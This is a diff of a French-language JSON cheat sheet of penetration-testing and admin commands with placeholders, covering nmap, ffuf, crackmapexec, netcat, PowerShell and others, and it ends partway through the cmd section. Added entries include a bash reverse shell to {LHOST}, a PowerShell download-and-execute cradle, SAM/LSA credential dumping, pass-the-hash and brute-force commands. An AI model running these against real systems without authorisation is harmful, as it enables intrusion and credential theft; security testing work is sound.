@@ -8,9 +8,75 @@
         {"title": "Scan rapide top 1000 ports", "cmd": "nmap -T4 -F {TARGET}", "vars": ["TARGET"]},
         {"title": "Scan complet avec versions", "cmd": "nmap -sV -sC -p- {TARGET}", "vars": ["TARGET"]},
         {"title": "Détection OS + scripts", "cmd": "nmap -A -O {TARGET}", "vars": ["TARGET"]},
+        {"title": "Scan SYN stealth", "cmd": "nmap -sS -p {PORTS} {TARGET}", "vars": ["PORTS","TARGET"]},
         {"title": "Scan UDP top 100", "cmd": "nmap -sU --top-ports 100 {TARGET}", "vars": ["TARGET"]},
-        {"title": "Export XML", "cmd": "nmap -oX scan.xml -sV {TARGET}", "vars": ["TARGET"]},
-        {"title": "Scan réseau CIDR", "cmd": "nmap -sn {TARGET}/24", "vars": ["TARGET"]}
+        {"title": "Scripts vulnérabilités", "cmd": "nmap --script vuln {TARGET}", "vars": ["TARGET"]},
+        {"title": "Script SMB vulnérabilités", "cmd": "nmap --script smb-vuln* -p 445 {TARGET}", "vars": ["TARGET"]},
+        {"title": "Grab banners HTTP", "cmd": "nmap -sV --script=http-headers -p 80,443 {TARGET}", "vars": ["TARGET"]},
+        {"title": "Export XML", "cmd": "nmap -oX {OUTPUT}.xml -sV {TARGET}", "vars": ["OUTPUT","TARGET"]},
+        {"title": "Scan réseau CIDR", "cmd": "nmap -sn {TARGET}/24", "vars": ["TARGET"]},
+        {"title": "Exclure des cibles", "cmd": "nmap {TARGET}/24 --exclude {EXCLUDE}", "vars": ["TARGET","EXCLUDE"]}
+      ]
+    },
+    {
+      "tool": "gobuster",
+      "category": "Reconnaissance",
+      "description": "Brute-force de répertoires et sous-domaines",
+      "commands": [
+        {"title": "Scan répertoires", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Scan sous-domaines", "cmd": "gobuster dns -d {TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Scan avec extensions", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST} -x php,html,txt,bak", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Scan avec auth Basic", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST} -U admin -P {PASSWORD}", "vars": ["TARGET","WORDLIST","PASSWORD"]},
+        {"title": "VHOST fuzzing", "cmd": "gobuster vhost -u http://{TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]}
+      ]
+    },
+    {
+      "tool": "ffuf",
+      "category": "Reconnaissance",
+      "description": "Fast web fuzzer pour répertoires, paramètres et VHOST",
+      "commands": [
+        {"title": "Fuzzing répertoires", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Fuzzing paramètre GET", "cmd": "ffuf -u http://{TARGET}?FUZZ=test -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Fuzzing sous-domaines", "cmd": "ffuf -u http://{TARGET} -H \"Host: FUZZ.{TARGET}\" -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Filtrer par code HTTP", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST} -fc 404,403", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Fuzzing POST body", "cmd": "ffuf -u http://{TARGET}/login -X POST -d \"user=FUZZ&pass=test\" -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Filtrer par taille de réponse", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST} -fs {SIZE}", "vars": ["TARGET","WORDLIST","SIZE"]}
+      ]
+    },
+    {
+      "tool": "nikto",
+      "category": "Reconnaissance",
+      "description": "Scanner de vulnérabilités web",
+      "commands": [
+        {"title": "Scan basique", "cmd": "nikto -h http://{TARGET}", "vars": ["TARGET"]},
+        {"title": "Scan avec port", "cmd": "nikto -h {TARGET} -p {PORT}", "vars": ["TARGET","PORT"]},
+        {"title": "Scan HTTPS", "cmd": "nikto -h https://{TARGET} -ssl", "vars": ["TARGET"]},
+        {"title": "Export rapport HTML", "cmd": "nikto -h http://{TARGET} -o report.html -Format html", "vars": ["TARGET"]},
+        {"title": "Scan avec authentification", "cmd": "nikto -h http://{TARGET} -id admin:{PASSWORD}", "vars": ["TARGET","PASSWORD"]}
+      ]
+    },
+    {
+      "tool": "masscan",
+      "category": "Reconnaissance",
+      "description": "Scanner de ports ultra-rapide pour large surface",
+      "commands": [
+        {"title": "Scan top ports rapide", "cmd": "masscan {TARGET} -p 22,80,443,8080 --rate 1000", "vars": ["TARGET"]},
+        {"title": "Scan tous ports", "cmd": "masscan {TARGET} -p 0-65535 --rate 10000", "vars": ["TARGET"]},
+        {"title": "Scan réseau entier", "cmd": "masscan {TARGET}/24 -p 80,443 --rate 5000", "vars": ["TARGET"]},
+        {"title": "Export JSON", "cmd": "masscan {TARGET} -p 1-1024 --rate 1000 -oJ scan.json", "vars": ["TARGET"]},
+        {"title": "Bannière grabbing", "cmd": "masscan {TARGET} -p 80 --banners --rate 100", "vars": ["TARGET"]}
+      ]
+    },
+    {
+      "tool": "enum4linux-ng",
+      "category": "Reconnaissance",
+      "description": "Enumération de partages Windows/Samba/LDAP",
+      "commands": [
+        {"title": "Enum complète", "cmd": "enum4linux-ng -A {TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum utilisateurs", "cmd": "enum4linux-ng -U {TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum shares", "cmd": "enum4linux-ng -S {TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum avec creds", "cmd": "enum4linux-ng -u {USER} -p {PASSWORD} -A {TARGET}", "vars": ["USER","PASSWORD","TARGET"]},
+        {"title": "Export YAML", "cmd": "enum4linux-ng -A {TARGET} -oY results.yaml", "vars": ["TARGET"]}
       ]
     },
     {
@@ -39,30 +105,6 @@
       ]
     },
     {
-      "tool": "gobuster",
-      "category": "Reconnaissance",
-      "description": "Brute-force de répertoires et sous-domaines",
-      "commands": [
-        {"title": "Scan répertoires", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
-        {"title": "Scan sous-domaines", "cmd": "gobuster dns -d {TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
-        {"title": "Scan avec extensions", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST} -x php,html,txt", "vars": ["TARGET","WORDLIST"]},
-        {"title": "Scan avec auth Basic", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST} -U admin -P {PASSWORD}", "vars": ["TARGET","WORDLIST","PASSWORD"]},
-        {"title": "VHOST fuzzing", "cmd": "gobuster vhost -u http://{TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]}
-      ]
-    },
-    {
-      "tool": "ffuf",
-      "category": "Reconnaissance",
-      "description": "Fast web fuzzer pour répertoires, paramètres et VHOST",
-      "commands": [
-        {"title": "Fuzzing répertoires", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
-        {"title": "Fuzzing paramètre GET", "cmd": "ffuf -u http://{TARGET}?FUZZ=test -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
-        {"title": "Fuzzing sous-domaines", "cmd": "ffuf -u http://{TARGET} -H \"Host: FUZZ.{TARGET}\" -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
-        {"title": "Filtrer par code HTTP", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST} -fc 404", "vars": ["TARGET","WORDLIST"]},
-        {"title": "Fuzzing POST body", "cmd": "ffuf -u http://{TARGET}/login -X POST -d \"user=FUZZ&pass=test\" -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]}
-      ]
-    },
-    {
       "tool": "metasploit",
       "category": "Exploitation",
       "description": "Framework d'exploitation modulaire",
@@ -76,15 +118,30 @@
       ]
     },
     {
-      "tool": "nikto",
-      "category": "Reconnaissance",
-      "description": "Scanner de vulnérabilités web",
+      "tool": "wpscan",
+      "category": "Exploitation",
+      "description": "Scanner de vulnérabilités WordPress",
       "commands": [
-        {"title": "Scan basique", "cmd": "nikto -h http://{TARGET}", "vars": ["TARGET"]},
-        {"title": "Scan avec port", "cmd": "nikto -h {TARGET} -p {PORT}", "vars": ["TARGET","PORT"]},
-        {"title": "Scan HTTPS", "cmd": "nikto -h https://{TARGET} -ssl", "vars": ["TARGET"]},
-        {"title": "Export rapport HTML", "cmd": "nikto -h http://{TARGET} -o report.html -Format html", "vars": ["TARGET"]},
-        {"title": "Scan avec authentification", "cmd": "nikto -h http://{TARGET} -id admin:{PASSWORD}", "vars": ["TARGET","PASSWORD"]}
+        {"title": "Scan basique", "cmd": "wpscan --url http://{TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum plugins", "cmd": "wpscan --url http://{TARGET} --enumerate p", "vars": ["TARGET"]},
+        {"title": "Enum utilisateurs", "cmd": "wpscan --url http://{TARGET} --enumerate u", "vars": ["TARGET"]},
+        {"title": "Brute-force comptes", "cmd": "wpscan --url http://{TARGET} -U {USER} -P {WORDLIST}", "vars": ["TARGET","USER","WORDLIST"]},
+        {"title": "Scan avec API token", "cmd": "wpscan --url http://{TARGET} --api-token {TOKEN} --enumerate vp", "vars": ["TARGET","TOKEN"]}
+      ]
+    },
+    {
+      "tool": "crackmapexec",
+      "category": "Post-Exploitation",
+      "description": "Framework de pentest pour Active Directory et SMB",
+      "commands": [
+        {"title": "Enum SMB", "cmd": "crackmapexec smb {TARGET}", "vars": ["TARGET"]},
+        {"title": "Brute-force SMB", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {WORDLIST}", "vars": ["TARGET","USER","WORDLIST"]},
+        {"title": "Pass-the-Hash", "cmd": "crackmapexec smb {TARGET} -u {USER} -H {HASH}", "vars": ["TARGET","USER","HASH"]},
+        {"title": "Enum shares", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} --shares", "vars": ["TARGET","USER","PASSWORD"]},
+        {"title": "Exécuter commande", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} -x \"{CMD}\"", "vars": ["TARGET","USER","PASSWORD","CMD"]},
+        {"title": "Dump SAM via SMB", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} --sam", "vars": ["TARGET","USER","PASSWORD"]},
+        {"title": "LSASS dump", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} --lsa", "vars": ["TARGET","USER","PASSWORD"]},
+        {"title": "WinRM access", "cmd": "crackmapexec winrm {TARGET} -u {USER} -p {PASSWORD}", "vars": ["TARGET","USER","PASSWORD"]}
       ]
     },
     {
@@ -100,6 +157,32 @@
       ]
     },
     {
+      "tool": "amass",
+      "category": "OSINT",
+      "description": "Cartographie de surface d'attaque et énumération de sous-domaines",
+      "commands": [
+        {"title": "Enum passive", "cmd": "amass enum -passive -d {TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum active", "cmd": "amass enum -active -d {TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum avec brute-force", "cmd": "amass enum -brute -d {TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Intel sur organisation", "cmd": "amass intel -org \"{ORG}\"", "vars": ["ORG"]},
+        {"title": "Export JSON", "cmd": "amass enum -d {TARGET} -json {OUTPUT}.json", "vars": ["TARGET","OUTPUT"]},
+        {"title": "Visualisation graphe", "cmd": "amass viz -d3 -d {TARGET}", "vars": ["TARGET"]}
+      ]
+    },
+    {
+      "tool": "shodan-cli",
+      "category": "OSINT",
+      "description": "Interroger Shodan depuis le terminal pour la recon passive",
+      "commands": [
+        {"title": "Info sur un host", "cmd": "shodan host {TARGET}", "vars": ["TARGET"]},
+        {"title": "Recherche libre", "cmd": "shodan search \"{QUERY}\"", "vars": ["QUERY"]},
+        {"title": "Votre IP publique", "cmd": "shodan myip", "vars": []},
+        {"title": "Statistiques d'une requête", "cmd": "shodan stats \"{QUERY}\"", "vars": ["QUERY"]},
+        {"title": "Télécharger résultats", "cmd": "shodan download {OUTPUT} \"{QUERY}\"", "vars": ["OUTPUT","QUERY"]},
+        {"title": "Initialiser la clé API", "cmd": "shodan init {APIKEY}", "vars": ["APIKEY"]}
+      ]
+    },
+    {
       "tool": "aircrack-ng",
       "category": "Réseau",
       "description": "Suite d'audit de sécurité Wi-Fi",
@@ -112,27 +195,45 @@
       ]
     },
     {
-      "tool": "john",
-      "category": "Cracking",
-      "description": "John the Ripper — cracker de mots de passe",
+      "tool": "netcat",
+      "category": "Réseau",
+      "description": "Couteau suisse réseau — connexions TCP/UDP, transferts, reverse shells",
       "commands": [
-        {"title": "Crack basique", "cmd": "john {HASH}", "vars": ["HASH"]},
-        {"title": "Crack avec wordlist", "cmd": "john --wordlist={WORDLIST} {HASH}", "vars": ["WORDLIST","HASH"]},
-        {"title": "Mode règles", "cmd": "john --wordlist={WORDLIST} --rules {HASH}", "vars": ["WORDLIST","HASH"]},
-        {"title": "Afficher mots de passe", "cmd": "john --show {HASH}", "vars": ["HASH"]},
-        {"title": "Format spécifique", "cmd": "john --format={FORMAT} --wordlist={WORDLIST} {HASH}", "vars": ["FORMAT","WORDLIST","HASH"]}
+        {"title": "Écouter sur un port", "cmd": "nc -lvnp {PORT}", "vars": ["PORT"]},
+        {"title": "Se connecter à un host", "cmd": "nc {TARGET} {PORT}", "vars": ["TARGET","PORT"]},
+        {"title": "Banner grabbing", "cmd": "nc -v {TARGET} {PORT}", "vars": ["TARGET","PORT"]},
+        {"title": "Transférer un fichier (envoi)", "cmd": "nc -lvnp {PORT} < {FILE}", "vars": ["PORT","FILE"]},
+        {"title": "Transférer un fichier (réception)", "cmd": "nc {TARGET} {PORT} > {FILE}", "vars": ["TARGET","PORT","FILE"]},
+        {"title": "Reverse shell bash", "cmd": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1", "vars": ["LHOST","LPORT"]},
+        {"title": "Scan ports simple", "cmd": "nc -zv {TARGET} {PORTSTART}-{PORTEND}", "vars": ["TARGET","PORTSTART","PORTEND"]}
       ]
     },
     {
-      "tool": "crackmapexec",
-      "category": "Post-Exploitation",
-      "description": "Framework de pentest pour Active Directory et SMB",
+      "tool": "tcpdump",
+      "category": "Réseau",
+      "description": "Capture et analyse de paquets réseau en ligne de commande",
       "commands": [
-        {"title": "Enum SMB", "cmd": "crackmapexec smb {TARGET}", "vars": ["TARGET"]},
-        {"title": "Brute-force SMB", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {WORDLIST}", "vars": ["TARGET","USER","WORDLIST"]},
-        {"title": "Pass-the-Hash", "cmd": "crackmapexec smb {TARGET} -u {USER} -H {HASH}", "vars": ["TARGET","USER","HASH"]},
-        {"title": "Enum shares", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} --shares", "vars": ["TARGET","USER","PASSWORD"]},
-        {"title": "Exécuter commande", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} -x \"{CMD}\"", "vars": ["TARGET","USER","PASSWORD","CMD"]}
+        {"title": "Capturer sur interface", "cmd": "tcpdump -i {INTERFACE}", "vars": ["INTERFACE"]},
+        {"title": "Filtrer par hôte", "cmd": "tcpdump -i {INTERFACE} host {TARGET}", "vars": ["INTERFACE","TARGET"]},
+        {"title": "Filtrer par port", "cmd": "tcpdump -i {INTERFACE} port {PORT}", "vars": ["INTERFACE","PORT"]},
+        {"title": "Sauvegarder en .pcap", "cmd": "tcpdump -i {INTERFACE} -w {FILE}.pcap", "vars": ["INTERFACE","FILE"]},
+        {"title": "Lire une capture", "cmd": "tcpdump -r {FILE}.pcap", "vars": ["FILE"]},
+        {"title": "HTTP uniquement", "cmd": "tcpdump -i {INTERFACE} -A port 80", "vars": ["INTERFACE"]},
+        {"title": "Afficher ASCII + Hex", "cmd": "tcpdump -i {INTERFACE} -XX host {TARGET}", "vars": ["INTERFACE","TARGET"]}
+      ]
+    },
+    {
+      "tool": "john",
+      "category": "Cracking",
+      "description": "John the Ripper — cracker de mots de passe multi-formats",
+      "commands": [
+        {"title": "Crack basique (auto-detect)", "cmd": "john {HASHFILE}", "vars": ["HASHFILE"]},
+        {"title": "Crack avec wordlist", "cmd": "john --wordlist={WORDLIST} {HASHFILE}", "vars": ["WORDLIST","HASHFILE"]},
+        {"title": "Mode règles", "cmd": "john --wordlist={WORDLIST} --rules {HASHFILE}", "vars": ["WORDLIST","HASHFILE"]},
+        {"title": "Format NTLM", "cmd": "john --format=NT --wordlist={WORDLIST} {HASHFILE}", "vars": ["WORDLIST","HASHFILE"]},
+        {"title": "Crack hash SSH privée", "cmd": "ssh2john {KEYFILE} > hash.txt && john --wordlist={WORDLIST} hash.txt", "vars": ["KEYFILE","WORDLIST"]},
+        {"title": "Crack ZIP protégé", "cmd": "zip2john {ZIPFILE} > hash.txt && john --wordlist={WORDLIST} hash.txt", "vars": ["ZIPFILE","WORDLIST"]},
+        {"title": "Afficher mots de passe trouvés", "cmd": "john --show {HASHFILE}", "vars": ["HASHFILE"]}
       ]
     },
     {
@@ -161,39 +262,220 @@
       ]
     },
     {
-      "tool": "masscan",
-      "category": "Reconnaissance",
-      "description": "Scanner de ports ultra-rapide pour large surface",
+      "tool": "bash",
+      "category": "Linux",
+      "description": "Shell Bash — one-liners système, fichiers, processus et réseau",
       "commands": [
-        {"title": "Scan top ports rapide", "cmd": "masscan {TARGET} -p 22,80,443,8080 --rate 1000", "vars": ["TARGET"]},
-        {"title": "Scan tous ports", "cmd": "masscan {TARGET} -p 0-65535 --rate 10000", "vars": ["TARGET"]},
-        {"title": "Scan réseau entier", "cmd": "masscan {TARGET}/24 -p 80,443 --rate 5000", "vars": ["TARGET"]},
-        {"title": "Export JSON", "cmd": "masscan {TARGET} -p 1-1024 --rate 1000 -oJ scan.json", "vars": ["TARGET"]},
-        {"title": "Bannière grabbing", "cmd": "masscan {TARGET} -p 80 --banners --rate 100", "vars": ["TARGET"]}
+        {"title": "Rechercher fichiers par nom", "cmd": "find / -name \"{FILENAME}\" 2>/dev/null", "vars": ["FILENAME"]},
+        {"title": "Fichiers avec bit SUID", "cmd": "find / -perm -4000 -type f 2>/dev/null", "vars": []},
+        {"title": "Fichiers modifiés récemment", "cmd": "find {PATH} -mtime -{DAYS} -type f", "vars": ["PATH","DAYS"]},
+        {"title": "Grep récursif insensible à la casse", "cmd": "grep -rin \"{PATTERN}\" {PATH}", "vars": ["PATTERN","PATH"]},
+        {"title": "Surveiller un fichier log", "cmd": "tail -f {LOGFILE}", "vars": ["LOGFILE"]},
+        {"title": "Connexions actives (ss)", "cmd": "ss -tulnp", "vars": []},
+        {"title": "Processus triés par CPU", "cmd": "ps aux --sort=-%cpu | head -20", "vars": []},
+        {"title": "Archiver un répertoire", "cmd": "tar -czf {ARCHIVE}.tar.gz {DIR}", "vars": ["ARCHIVE","DIR"]},
+        {"title": "Extraire une archive", "cmd": "tar -xzf {ARCHIVE}.tar.gz -C {DEST}", "vars": ["ARCHIVE","DEST"]},
+        {"title": "Crontab utilisateur", "cmd": "crontab -l", "vars": []},
+        {"title": "Variables d'env filtrées", "cmd": "env | grep -i {PATTERN}", "vars": ["PATTERN"]},
+        {"title": "Utilisation disque par dossier", "cmd": "du -sh {PATH}/* | sort -rh | head -20", "vars": ["PATH"]}
       ]
     },
     {
-      "tool": "enum4linux-ng",
-      "category": "Reconnaissance",
-      "description": "Enumération de partages Windows/Samba/LDAP",
+      "tool": "wget",
+      "category": "Linux",
+      "description": "Téléchargement de fichiers et mirroring de sites web",
       "commands": [
-        {"title": "Enum complète", "cmd": "enum4linux-ng -A {TARGET}", "vars": ["TARGET"]},
-        {"title": "Enum utilisateurs", "cmd": "enum4linux-ng -U {TARGET}", "vars": ["TARGET"]},
-        {"title": "Enum shares", "cmd": "enum4linux-ng -S {TARGET}", "vars": ["TARGET"]},
-        {"title": "Enum avec creds", "cmd": "enum4linux-ng -u {USER} -p {PASSWORD} -A {TARGET}", "vars": ["USER","PASSWORD","TARGET"]},
-        {"title": "Export YAML", "cmd": "enum4linux-ng -A {TARGET} -oY results.yaml", "vars": ["TARGET"]}
+        {"title": "Télécharger un fichier", "cmd": "wget {URL}", "vars": ["URL"]},
+        {"title": "Téléchargement silencieux nommé", "cmd": "wget -q -O {FILE} {URL}", "vars": ["FILE","URL"]},
+        {"title": "Reprendre un téléchargement", "cmd": "wget -c {URL}", "vars": ["URL"]},
+        {"title": "Mirror d'un site", "cmd": "wget -m -p --convert-links {URL}", "vars": ["URL"]},
+        {"title": "Télécharger depuis une liste", "cmd": "wget -i {FILELIST}", "vars": ["FILELIST"]},
+        {"title": "Limiter la vitesse", "cmd": "wget --limit-rate={RATE}k {URL}", "vars": ["RATE","URL"]},
+        {"title": "Avec authentification basic", "cmd": "wget --user={USER} --password={PASS} {URL}", "vars": ["USER","PASS","URL"]}
       ]
     },
     {
-      "tool": "wpscan",
-      "category": "Exploitation",
-      "description": "Scanner de vulnérabilités WordPress",
+      "tool": "jq",
+      "category": "Linux",
+      "description": "Parser, filtrer et transformer du JSON en ligne de commande",
       "commands": [
-        {"title": "Scan basique", "cmd": "wpscan --url http://{TARGET}", "vars": ["TARGET"]},
-        {"title": "Enum plugins", "cmd": "wpscan --url http://{TARGET} --enumerate p", "vars": ["TARGET"]},
-        {"title": "Enum utilisateurs", "cmd": "wpscan --url http://{TARGET} --enumerate u", "vars": ["TARGET"]},
-        {"title": "Brute-force comptes", "cmd": "wpscan --url http://{TARGET} -U {USER} -P {WORDLIST}", "vars": ["TARGET","USER","WORDLIST"]},
-        {"title": "Scan avec API token", "cmd": "wpscan --url http://{TARGET} --api-token {TOKEN} --enumerate vp", "vars": ["TARGET","TOKEN"]}
+        {"title": "Formater JSON (pretty)", "cmd": "cat {FILE} | jq '.'", "vars": ["FILE"]},
+        {"title": "Extraire un champ", "cmd": "cat {FILE} | jq '.{FIELD}'", "vars": ["FILE","FIELD"]},
+        {"title": "Lister clés d'un objet", "cmd": "cat {FILE} | jq 'keys'", "vars": ["FILE"]},
+        {"title": "Compter les éléments", "cmd": "cat {FILE} | jq '. | length'", "vars": ["FILE"]},
+        {"title": "Filtrer un tableau", "cmd": "cat {FILE} | jq '.[] | select(.status==\"{VALUE}\")'", "vars": ["FILE","VALUE"]},
+        {"title": "Extraire champs multiples", "cmd": "cat {FILE} | jq '.[] | {name:.name, id:.id}'", "vars": ["FILE"]},
+        {"title": "Pipe avec curl", "cmd": "curl -s {URL} | jq '.{FIELD}'", "vars": ["URL","FIELD"]},
+        {"title": "Output compact", "cmd": "cat {FILE} | jq -c '.[]'", "vars": ["FILE"]}
+      ]
+    },
+    {
+      "tool": "curl",
+      "category": "Web",
+      "description": "Requêtes HTTP/S — API, auth, upload et debug depuis le terminal",
+      "commands": [
+        {"title": "GET simple", "cmd": "curl -s {URL}", "vars": ["URL"]},
+        {"title": "Afficher headers de réponse", "cmd": "curl -I {URL}", "vars": ["URL"]},
+        {"title": "POST JSON", "cmd": "curl -s -X POST {URL} -H \"Content-Type: application/json\" -d '{DATA}'", "vars": ["URL","DATA"]},
+        {"title": "Avec token Bearer", "cmd": "curl -s -H \"Authorization: Bearer {TOKEN}\" {URL}", "vars": ["URL","TOKEN"]},
+        {"title": "Télécharger fichier", "cmd": "curl -sO {URL}", "vars": ["URL"]},
+        {"title": "Suivre les redirections", "cmd": "curl -sL {URL}", "vars": ["URL"]},
+        {"title": "Ignorer certificat TLS", "cmd": "curl -sk {URL}", "vars": ["URL"]},
+        {"title": "Upload fichier multipart", "cmd": "curl -F \"file=@{FILE}\" {URL}", "vars": ["FILE","URL"]},
+        {"title": "Custom User-Agent", "cmd": "curl -s -A \"{USERAGENT}\" {URL}", "vars": ["URL","USERAGENT"]},
+        {"title": "Via proxy HTTP", "cmd": "curl -s -x http://{PROXY} {URL}", "vars": ["PROXY","URL"]},
+        {"title": "Timing détaillé", "cmd": "curl -s -o /dev/null -w \"dns:%{time_namelookup} connect:%{time_connect} total:%{time_total}\" {URL}", "vars": ["URL"]}
+      ]
+    },
+    {
+      "tool": "nuclei",
+      "category": "Web",
+      "description": "Scanner de vulnérabilités basé sur templates YAML communautaires",
+      "commands": [
+        {"title": "Scan basique", "cmd": "nuclei -u {TARGET}", "vars": ["TARGET"]},
+        {"title": "Scan depuis liste de cibles", "cmd": "nuclei -l {TARGETS_FILE}", "vars": ["TARGETS_FILE"]},
+        {"title": "Templates par sévérité", "cmd": "nuclei -u {TARGET} -severity {SEVERITY}", "vars": ["TARGET","SEVERITY"]},
+        {"title": "Templates spécifiques", "cmd": "nuclei -u {TARGET} -t {TEMPLATE_DIR}", "vars": ["TARGET","TEMPLATE_DIR"]},
+        {"title": "Tags spécifiques", "cmd": "nuclei -u {TARGET} -tags {TAGS}", "vars": ["TARGET","TAGS"]},
+        {"title": "Export JSON", "cmd": "nuclei -u {TARGET} -json-export {OUTPUT}.json", "vars": ["TARGET","OUTPUT"]},
+        {"title": "Rate limiting", "cmd": "nuclei -u {TARGET} -rate-limit {RATE} -c {CONCURRENCY}", "vars": ["TARGET","RATE","CONCURRENCY"]}
+      ]
+    },
+    {
+      "tool": "git",
+      "category": "DevOps",
+      "description": "Contrôle de version — commandes essentielles et investigation",
+      "commands": [
+        {"title": "Cloner un dépôt", "cmd": "git clone {URL}", "vars": ["URL"]},
+        {"title": "Status + diff résumé", "cmd": "git status && git diff --stat", "vars": []},
+        {"title": "Commit avec message", "cmd": "git add -p && git commit -m \"{MESSAGE}\"", "vars": ["MESSAGE"]},
+        {"title": "Pousser une branche", "cmd": "git push origin {BRANCH}", "vars": ["BRANCH"]},
+        {"title": "Créer et changer de branche", "cmd": "git checkout -b {BRANCH}", "vars": ["BRANCH"]},
+        {"title": "Log graphe compact", "cmd": "git log --oneline --graph --all", "vars": []},
+        {"title": "Rechercher dans l'historique", "cmd": "git log -S \"{PATTERN}\" --oneline", "vars": ["PATTERN"]},
+        {"title": "Stash les changements", "cmd": "git stash push -m \"{MESSAGE}\"", "vars": ["MESSAGE"]},
+        {"title": "Rétablir un fichier", "cmd": "git checkout HEAD -- {FILE}", "vars": ["FILE"]},
+        {"title": "Cherry-pick commit", "cmd": "git cherry-pick {HASH}", "vars": ["HASH"]}
+      ]
+    },
+    {
+      "tool": "docker",
+      "category": "DevOps",
+      "description": "Gestion de conteneurs et images Docker",
+      "commands": [
+        {"title": "Lister conteneurs actifs", "cmd": "docker ps", "vars": []},
+        {"title": "Lancer un conteneur interactif", "cmd": "docker run -it --rm {IMAGE} /bin/bash", "vars": ["IMAGE"]},
+        {"title": "Exposer des ports", "cmd": "docker run -d -p {HPORT}:{CPORT} {IMAGE}", "vars": ["HPORT","CPORT","IMAGE"]},
+        {"title": "Shell dans un conteneur actif", "cmd": "docker exec -it {CONTAINER} /bin/bash", "vars": ["CONTAINER"]},
+        {"title": "Logs en temps réel", "cmd": "docker logs -f {CONTAINER}", "vars": ["CONTAINER"]},
+        {"title": "Build depuis Dockerfile", "cmd": "docker build -t {TAG} {PATH}", "vars": ["TAG","PATH"]},
+        {"title": "Copier fichier vers conteneur", "cmd": "docker cp {FILE} {CONTAINER}:{DEST}", "vars": ["FILE","CONTAINER","DEST"]},
+        {"title": "Inspecter un conteneur", "cmd": "docker inspect {CONTAINER}", "vars": ["CONTAINER"]},
+        {"title": "Nettoyer ressources inutilisées", "cmd": "docker system prune -af", "vars": []},
+        {"title": "docker-compose up", "cmd": "docker compose up -d", "vars": []}
+      ]
+    },
+    {
+      "tool": "powershell",
+      "category": "Windows",
+      "description": "PowerShell — administration, recon et scripting Windows",
+      "commands": [
+        {"title": "Processus triés par CPU", "cmd": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 20", "vars": []},
+        {"title": "Connexions réseau établies", "cmd": "Get-NetTCPConnection -State Established", "vars": []},
+        {"title": "Utilisateurs locaux", "cmd": "Get-LocalUser", "vars": []},
+        {"title": "Membres d'un groupe local", "cmd": "Get-LocalGroupMember -Group \"{GROUP}\"", "vars": ["GROUP"]},
+        {"title": "Télécharger un fichier", "cmd": "Invoke-WebRequest -Uri {URL} -OutFile {FILE}", "vars": ["URL","FILE"]},
+        {"title": "Exécuter depuis mémoire (cradle)", "cmd": "IEX (New-Object Net.WebClient).DownloadString('{URL}')", "vars": ["URL"]},
+        {"title": "Rechercher fichiers récursivement", "cmd": "Get-ChildItem -Path {PATH} -Recurse -Filter \"{PATTERN}\"", "vars": ["PATH","PATTERN"]},
+        {"title": "Services en cours d'exécution", "cmd": "Get-Service | Where-Object Status -eq Running", "vars": []},
+        {"title": "Chercher variable d'environnement", "cmd": "Get-ChildItem Env: | Where-Object Name -like \"*{PATTERN}*\"", "vars": ["PATTERN"]},
+        {"title": "Encoder en Base64 Unicode", "cmd": "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('{CMD}'))", "vars": ["CMD"]}
+      ]
+    },
+    {
+      "tool": "cmd",
+      "category": "Windows",
+      "description": "Invite de commandes Windows — net, wmic, reg et recon AD",
+      "commands": [
+        {"title": "Infos système", "cmd": "systeminfo", "vars": []},
+        {"title": "Utilisateurs du domaine", "cmd": "net user /domain", "vars": []},
+        {"title": "Groupes du domaine", "cmd": "net group /domain", "vars": []},
+        {"title": "Mapper un partage réseau", "cmd": "net use Z: \\\\{TARGET}\\{SHARE} /user:{USER} {PASSWORD}", "vars": ["TARGET","SHARE","USER","PASSWORD"]},
+        {"title": "Processus en cours", "cmd": "tasklist /v", "vars": []},
+        {"title": "Tuer un processus", "cmd": "taskkill /PID {PID} /F", "vars": ["PID"]},
+        {"title": "Routes réseau", "cmd": "route print", "vars": []},
